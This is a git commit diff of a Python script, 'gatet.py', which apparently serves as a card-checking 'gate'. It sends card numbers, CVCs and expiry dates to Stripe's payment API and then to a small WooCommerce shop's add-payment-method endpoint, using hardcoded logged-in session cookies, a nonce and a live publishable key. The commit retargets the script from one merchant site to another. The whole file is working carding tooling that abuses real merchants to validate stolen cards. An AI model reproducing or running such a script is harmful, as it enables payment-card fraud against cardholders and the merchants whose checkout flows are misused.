49549fa20bcc14a307f45c6ab11744ac0ce15eb0
nomi924500-sudo <nomi924500@gmail.com>
2026-02-23 20:26:06 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,37 +26,34 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10008&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fbadb92382f%3B+stripe-js-v3%2Fbadb92382f%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbespokeutilitydesign.uk&time_on_page=51373&client_attribution_metadata[client_session_id]=5d8c53ea-89bb-40b7-aea7-f3e2a291119b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a412a4ce-f7c1-4543-b6f6-0f860ec628c4&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51QjnPV2MjoKV3YuRePNjSPTGO3FHCRCYwZLtGRtRvQRuKVINj96iZlxGdx6jukb5uYQQGWPq04ClZYwIIChOQis9007yEEZqcf&_stripe_version=2024-06-20'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fbadb92382f%3B+stripe-js-v3%2Fbadb92382f%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmelhairandstyle.com&time_on_page=91265&client_attribution_metadata[client_session_id]=f8335678-dd26-4403-bbfb-a0ccbb60ff86&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=6df4a559-5a2f-4d3d-af9f-9cd66ba2a85c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_tdIywCY9lRimUDnIsqgpXVZ0&_stripe_version=2024-06-20'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'wordpress_sec_d54127facf26163901c7742e75741c76': 'waow%7C1771936851%7CZctDLDILff7adenRsYkgNIprFhV4R5LLpzHcLF21bOj%7Cbd39cd14dc3824e8b103ecb3dec1fd0dd39a60e34cce548f513a1821c7208d2c',
-	    '_ga': 'GA1.1.1575939560.1770368766',
-	    '_gcl_au': '1.1.262757717.1770368766',
-	    '__stripe_mid': '549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6',
-	    '__stripe_sid': 'cf9e0d68-3d35-4b80-ac83-aa0a9d3a7082d422bc',
-	    'wordpress_logged_in_d54127facf26163901c7742e75741c76': 'waow%7C1771936851%7CZctDLDILff7adenRsYkgNIprFhV4R5LLpzHcLF21bOj%7Cd0befd200498a3d9c78b9b40a8327ca40db2496936ac368371b530cff848c494',
+	    'wordpress_sec_2ac48f42219d3c63af332d42e95b4214': 'nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7C7c7eaf23c6390605800262459d0d38ff6b042309412cd0da49585ca8f8bd6f75',
+	    'wordpress_logged_in_2ac48f42219d3c63af332d42e95b4214': 'nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7Cbc383aa61621dd82b1929749884261e14207ff89e4e5d76cf34ab802aad16f04',
+	    '__stripe_mid': '858da1fb-4f59-47f5-8150-a4fdf8120705baa446',
 	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2026-02-22%2012%3A10%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'sbjs_first_add': 'fd%3D2026-02-22%2012%3A10%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
+	    'sbjs_current_add': 'fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F',
+	    'sbjs_first_add': 'fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F',
 	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
 	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
 	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    '_ga_WVQWTK679F': 'GS2.1.s1771764000$o11$g1$t1771764058$j2$l0$h0',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F',
+	    '__stripe_sid': '9ac1b1a8-cca0-41ad-8b4d-5e2030816bf7a466d5',
 	}
 	
 	headers = {
-	    'authority': 'bespokeutilitydesign.uk',
+	    'authority': 'melhairandstyle.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'wordpress_sec_d54127facf26163901c7742e75741c76=waow%7C1771936851%7CZctDLDILff7adenRsYkgNIprFhV4R5LLpzHcLF21bOj%7Cbd39cd14dc3824e8b103ecb3dec1fd0dd39a60e34cce548f513a1821c7208d2c; _ga=GA1.1.1575939560.1770368766; _gcl_au=1.1.262757717.1770368766; __stripe_mid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6; __stripe_sid=cf9e0d68-3d35-4b80-ac83-aa0a9d3a7082d422bc; wordpress_logged_in_d54127facf26163901c7742e75741c76=waow%7C1771936851%7CZctDLDILff7adenRsYkgNIprFhV4R5LLpzHcLF21bOj%7Cd0befd200498a3d9c78b9b40a8327ca40db2496936ac368371b530cff848c494; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-22%2012%3A10%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2026-02-22%2012%3A10%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_WVQWTK679F=GS2.1.s1771764000$o11$g1$t1771764058$j2$l0$h0',
-	    'origin': 'https://bespokeutilitydesign.uk',
-	    'referer': 'https://bespokeutilitydesign.uk/my-account/add-payment-method/',
+	    # 'cookie': 'wordpress_sec_2ac48f42219d3c63af332d42e95b4214=nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7C7c7eaf23c6390605800262459d0d38ff6b042309412cd0da49585ca8f8bd6f75; wordpress_logged_in_2ac48f42219d3c63af332d42e95b4214=nwn90240%7C1772993073%7CFt5rbx2yn951GfC8GF1sjIPV8nXMK7bqAYR7LotPMSf%7Cbc383aa61621dd82b1929749884261e14207ff89e4e5d76cf34ab802aad16f04; __stripe_mid=858da1fb-4f59-47f5-8150-a4fdf8120705baa446; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-02-23%2013%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmelhairandstyle.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=9ac1b1a8-cca0-41ad-8b4d-5e2030816bf7a466d5',
+	    'origin': 'https://melhairandstyle.com',
+	    'referer': 'https://melhairandstyle.com/my-account/add-payment-method/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -71,9 +68,9 @@ def Tele(ccx):
 	    'action': 'wc_stripe_create_and_confirm_setup_intent',
 	    'wc-stripe-payment-method': f'{pm}',
 	    'wc-stripe-payment-type': 'card',
-	    '_ajax_nonce': '823cb8d04d',
+	    '_ajax_nonce': '38bf5b0f6e',
 	}
 	
-	r2 = requests.post('https://bespokeutilitydesign.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	r2 = requests.post('https://melhairandstyle.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
